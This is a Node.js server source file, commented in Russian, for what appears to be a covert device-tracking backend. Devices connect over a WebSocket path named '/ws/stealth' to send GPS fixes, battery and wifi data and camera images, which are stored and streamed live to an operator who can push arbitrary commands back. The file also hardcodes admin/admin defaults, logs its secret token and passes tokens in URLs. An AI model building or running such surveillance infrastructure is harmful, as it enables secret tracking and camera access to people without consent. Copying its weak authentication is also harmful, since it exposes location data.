import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { createClient } from "@supabase/supabase-js";
import { WebSocketServer } from 'ws';
import http from 'http';

const app = express();
const PORT = process.env.PORT || 3000;

console.log('Starting location tracker server...');

// Создаем HTTP сервер
const server = http.createServer(app);

// === Supabase подключение ===
const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
const supabaseKey = process.env.SUPABASE_ANON_KEY;

// === Config Auth ===
const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";

console.log('Configuration:');
console.log('- Supabase URL:', supabaseUrl);
console.log('- Admin User:', ADMIN_USER);
console.log('- Secret Token:', SECRET_TOKEN);

// Проверка наличия ключей
if (!supabaseUrl || !supabaseKey) {
    console.error('Missing Supabase credentials');
    process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

// === Middlewares ===
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static("public"));

// === WebSocket Setup ===
const activeConnections = new Map();
const webClients = new Set();

// WebSocket для устройств
console.log('Initializing device WebSocket server...');
const wss = new WebSocketServer({ 
    server,
    path: '/ws/stealth'
});

wss.on('connection', (ws, req) => {
    console.log('NEW DEVICE WebSocket connection:', req.url);
    const url = new URL(req.url, `http://${req.headers.host}`);
    const deviceId = url.pathname.split('/').pop();
    
    console.log(`Device connected: ${deviceId}`);
    activeConnections.set(deviceId, ws);
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data.toString());
            console.log(`Message from ${deviceId}:`, message.type);
            
            // Пересылаем веб-клиентам
            broadcastToWebClients(deviceId, message);
            
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    ws.on('close', () => {
        activeConnections.delete(deviceId);
        console.log(`Device ${deviceId} disconnected`);
    });
    
    ws.on('error', (error) => {
        console.error('Device WebSocket error:', error);
    });
});

// WebSocket для веб-клиентов
console.log('Initializing web client WebSocket server...');
const webWss = new WebSocketServer({ 
    server,
    path: '/ws/live'
});

webWss.on('connection', (ws) => {
    console.log('NEW WEB CLIENT WebSocket connection');
    webClients.add(ws);
    
    ws.on('close', () => {
        webClients.delete(ws);
        console.log('Web client disconnected');
    });
    
    ws.on('error', (error) => {
        console.error('Web client WebSocket error:', error);
    });
});

function broadcastToWebClients(deviceId, message) {
    const data = JSON.stringify({
        deviceId,
        ...message
    });
    
    console.log(`Broadcasting to ${webClients.size} web clients from device ${deviceId}`);
    
    webClients.forEach(client => {
        if (client.readyState === 1) { // WebSocket.OPEN
            try {
                client.send(data);
            } catch (error) {
                console.error('Error sending to web client:', error);
            }
        }
    });
}

// === API ENDPOINTS ===

// Логин
app.post("/api/login", (req, res) => {
    const { username, password } = req.body;
    
    console.log('Login attempt:', username);
    
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        res.json({ 
            success: true, 
            token: SECRET_TOKEN 
        });
    } else {
        res.status(401).json({ 
            success: false, 
            error: 'Invalid credentials' 
        });
    }
});

// Команды для устройств
app.post('/api/device/command', (req, res) => {
    const { device_id, command, token } = req.body;
    
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: "Forbidden" });
    }
    
    const deviceConnection = activeConnections.get(device_id);
    if (deviceConnection && deviceConnection.readyState === 1) {
        deviceConnection.send(JSON.stringify({
            action: command,
            timestamp: Date.now()
        }));
        
        console.log(`Command sent to device ${device_id}: ${command}`);
        res.json({ success: true, command_sent: command });
    } else {
        console.log(`Device ${device_id} not connected`);
        res.status(404).json({ error: "Device not connected" });
    }
});

// Прием изображений через HTTP (fallback)
app.post('/api/camera/image', (req, res) => {
    const receivedToken = req.headers.authorization; // Убираем split
    
    if (receivedToken !== SECRET_TOKEN) {
        console.log('Unauthorized image request:', receivedToken);
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { type, device_id, data, timestamp } = req.body;
    
    console.log(`Received ${type} from device ${device_id} via HTTP`);
    
    // Пересылаем всем веб-клиентам
    broadcastToWebClients(device_id, { 
        type, 
        data, 
        timestamp: timestamp || Date.now() 
    });
    
    res.json({ success: true });
});

// Прием данных локации
app.post("/api/location", async (req, res) => {
    const receivedToken = req.headers.authorization; // Убираем split
    
    if (receivedToken !== SECRET_TOKEN) {
        console.log('Unauthorized location request:', receivedToken);
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;
    
    // Валидация GPS данных
    if (!validateGPSPoint(latitude, longitude, accuracy)) {
        return res.status(400).json({ error: "Invalid GPS coordinates" });
    }
    
    try {
        const { error } = await supabase
            .from('locations')
            .insert([{
                device_id,
                device_name,
                latitude: parseFloat(latitude),
                longitude: parseFloat(longitude),
                timestamp: new Date(timestamp).toISOString(), // Правильный формат для timestamp
                accuracy: parseFloat(accuracy),
                battery: parseInt(battery),
                wifi_info: wifi_info || null
            }]);
            
        if (error) {
            console.error('Supabase error:', error);
            return res.status(500).json({ error: 'Database error' });
        }
        
        console.log(`Location saved for device ${device_id}`);
        res.json({ success: true });
        
    } catch (error) {
        console.error('Location save error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Получение списка устройств
app.get("/api/devices/:token", async (req, res) => {
    const { token } = req.params;
    
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: "Forbidden" });
    }
    
    try {
        const { data, error } = await supabase
            .from('locations')
            .select(`
                device_id,
                device_name,
                latitude,
                longitude,
                timestamp,
                battery,
                accuracy
            `)
            .order('timestamp', { ascending: false });
            
        if (error) throw error;
        
        // Группируем по устройствам
        const devices = {};
        data.forEach(location => {
            if (!devices[location.device_id]) {
                devices[location.device_id] = {
                    device_id: location.device_id,
                    device_name: location.device_name,
                    last_seen: location.timestamp,
                    battery: location.battery,
                    location_count: 0,
                    last_location: {
                        lat: location.latitude,
                        lng: location.longitude
                    },
                    is_connected: activeConnections.has(location.device_id)
                };
            }
            devices[location.device_id].location_count++;
        });
        
        console.log(`Returned ${Object.keys(devices).length} devices`);
        res.json(Object.values(devices));
        
    } catch (error) {
        console.error('Database error:', error);
        res.status(500).json({ error: 'Database error' });
    }
});

// Получение данных конкретного устройства
app.get("/api/device/:deviceId/:token", async (req, res) => {
    const { deviceId, token } = req.params;
    
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: "Forbidden" });
    }
    
    try {
        const { data, error } = await supabase
            .from('locations')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: true })
            .limit(1000);
            
        if (error) throw error;
        
        const device = data.length > 0 ? data[0] : null;
        
        // Фильтруем дубликаты
        const filteredLocations = filterDuplicatePoints(data.filter(loc => 
            validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy)
        ));
        
        res.json({
            device_id: deviceId,
            device_name: device?.device_name || 'Unknown Device',
            locations: filteredLocations,
            total_points: data.length,
            is_connected: activeConnections.has(deviceId)
        });
        
    } catch (error) {
        console.error('Database error:', error);
        res.status(500).json({ error: 'Database error' });
    }
});

// Analytics (упрощенная версия)
app.get("/api/analytics/:device_id/:token", async (req, res) => {
    const { device_id, token } = req.params;
    
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: "Forbidden" });
    }
    
    const days = parseInt(req.query.days) || 7;

    try {
        const { data: locations, error } = await supabase
            .from("locations")
            .select("device_id, device_name, latitude, longitude, timestamp, battery")
            .eq("device_id", device_id)
            .order("timestamp", { ascending: true })
            .limit(500);

        if (error) throw error;

        res.json({
            device_id,
            device_name: locations[0]?.device_name || 'Unknown Device',
            period_days: days,
            total_points: locations.length,
            locations: locations.slice(-100)
        });
        
    } catch (error) {
        console.error('Analytics error:', error);
        res.status(500).json({ error: 'Analytics error' });
    }
});

// Статические файлы
app.get('/', (req, res) => {
    res.sendFile('index.html', { root: 'public' });
});

// === Utility Functions ===
function validateGPSPoint(lat, lng, accuracy) {
    if (!lat || !lng || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
        return false;
    }
    if (accuracy && accuracy > 100) {
        return false;
    }
    return true;
}

function filterDuplicatePoints(locations, minDistance = 10) {
    if (locations.length < 2) return locations;

    const filtered = [locations[0]];

    for (let i = 1; i < locations.length; i++) {
        const prev = filtered[filtered.length - 1];
        const curr = locations[i];

        const distance = getDistance(
            parseFloat(prev.latitude), parseFloat(prev.longitude),
            parseFloat(curr.latitude), parseFloat(curr.longitude)
        );

        if (distance > minDistance) {
            filtered.push(curr);
        }
    }

    return filtered;
}

function getDistance(lat1, lon1, lat2, lon2) {
    const R = 6371e3;
    const φ1 = lat1 * Math.PI / 180;
    const φ2 = lat2 * Math.PI / 180;
    const Δφ = (lat2 - lat1) * Math.PI / 180;
    const Δλ = (lon2 - lon1) * Math.PI / 180;

    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
              Math.cos(φ1) * Math.cos(φ2) *
              Math.sin(Δλ/2) * Math.sin(Δλ/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));

    return R * c;
}

// Запуск сервера
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log('WebSocket servers initialized:');
    console.log('- Device WebSocket: /ws/stealth');
    console.log('- Web Client WebSocket: /ws/live');
    console.log('Available endpoints:');
    console.log('- POST /api/login');
    console.log('- POST /api/location');
    console.log('- POST /api/camera/image');
    console.log('- GET /api/devices/:token');
    console.log('Server ready for connections!');
});

// Обработка ошибок WebSocket сервера
wss.on('error', (error) => {
    console.error('Device WebSocket Server error:', error);
});

webWss.on('error', (error) => {
    console.error('Web Client WebSocket Server error:', error);
});

